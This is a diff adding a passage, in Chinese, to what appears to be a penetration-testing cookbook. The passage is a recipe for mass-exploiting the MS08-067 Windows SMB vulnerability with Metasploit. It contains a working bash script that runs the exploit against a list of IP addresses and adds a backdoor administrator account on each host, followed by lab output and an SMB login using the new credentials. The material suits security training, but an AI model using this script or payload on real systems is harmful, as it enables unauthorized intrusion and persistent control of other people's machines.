@@ -545,3 +545,67 @@ ICMP 流量似乎是一种用于验证目标系统的可利用性的非直观方
 
 ## 8.8 创建管理账户的多线程 MSF 利用
 
+该秘籍展示了如何使用 bash ，在多个系统上利用单个漏洞，并在每个系统上添加一个新的管理员帐户。 该技术可以用于以后通过使用集成终端服务或 SMB 认证来访问沦陷的系统。
+
+### 准备
+
+要使用此秘籍中演示的脚本，你需要访问多个系统，每个系统都具有可使用 Metasploit 利用的相同漏洞。 提供的示例复制了运行 Windows XP 漏洞版本的 VM，来生成 MS08-067 漏洞的三个实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。 此外，本节还需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。
+
+### 操作步骤
+
+下面的示例演示了如何使用 bash 脚本同时利用单个漏洞的多个实例。 特别是，此脚本可用于通过引用 IP 地址的输入列表来利用 MS08-067 NetAPI 漏洞的多个实例：
+
+```sh
+#!/bin/bash
+
+if [ ! $1 ]; then echo "Usage: #./script <host file> <username> <password>"; 
+exit; fi
+
+iplist=$1 
+user=$2 
+pass=$3
+
+for ip in $(cat $iplist) 
+do   
+    gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/exec CMD="cmd.exe /c \"net user $user $pass /add && net localgroup administrators $user /add\"" RHOST=$ip E   
+    echo "Exploiting $ip and adding user $user" 
+done 
+```
+
+由于载荷不同，此脚本与以前的多线程利用脚本不同。 这里，在成功利用时会依次执行两个命令。 这两个命令中的第一个命令创建一个名为`hutch`的新用户帐户，并定义关联的密码。 第二个命令将新创建的用户帐户添加到本地`Administrators`组：
+
+```
+root@KaliLinux:~# ./multipwn.sh 
+Usage: #./script <host file> <username> <password> 
+root@KaliLinux:~# ./multipwn.sh iplist.txt hutch P@33word 
+Exploiting 172.16.36.132 and adding user hutch 
+Exploiting 172.16.36.158 and adding user hutch 
+Exploiting 172.16.36.225 and adding user hutch
+
+```
+
+如果在不提供任何参数的情况下执行脚本，脚本将输出相应的用法。 该使用描述表明，该脚本应该以一个参数来执行，该参数指定了包含目标 IP 地址列表的文本文件的文件名。 一旦以这个参数执行，会开始弹出一系列新的终端。 这些终端中的每一个将运行输入列表中的 IP 地址之一的利用序列。 原始执行终端将在执行时输出进程列表，并显是在每个进程上添加的新用户帐户。 在每个终端中完成利用序列之后，可以通过诸如 RDP 的集成终端服务，或通过远程 SMB 认证来访问系统。 为了演示添加了该帐户，Metasploit SMB_Login 辅助模块用于使用新添加的凭据远程登录到受攻击的系统：
+
+```
+msf > use auxiliary/scanner/smb/smb_login 
+msf  auxiliary(smb_login) > set SMBUser hutch 
+SMBUser => hutch 
+msf  auxiliary(smb_login) > set SMBPass P@33word 
+SMBPass => P@33word 
+msf  auxiliary(smb_login) > set RHOSTS 172.16.36.225 
+RHOSTS => 172.16.36.225 
+msf  auxiliary(smb_login) > run
+
+[*] 172.16.36.225:445 SMB - Starting SMB login bruteforce 
+[+] 172.16.36.225:445 - SUCCESSFUL LOGIN (Windows 5.1) hutch :  [STATUS_ SUCCESS] 
+[*] Username is case insensitive 
+[*] Domain is ignored 
+[*] Scanned 1 of 1 hosts (100% complete) 
+[*] Auxiliary module execution completed
+```
+
+`SMB_Login`辅助模块的结果表明，使用新创建的凭据登录成功。 然后，这个新创建的帐户可以用于进一步的恶意目的，或者可以使用脚本来测试帐户是否存在，来验证漏洞的利用。
+
+### 工作原理
+
+通过在每个利用的系统上添加用户帐户，攻击者可以继续对该系统执行后续操作。 这种方法有优点和缺点。 在受沦陷系统上添加新帐户比攻破现有帐户更快，并且可以立即访问现有的远程服务（如 RDP）。 但是，添加新帐户并不非常隐秘，有时可以触发基于主机的入侵检测系统的警报。
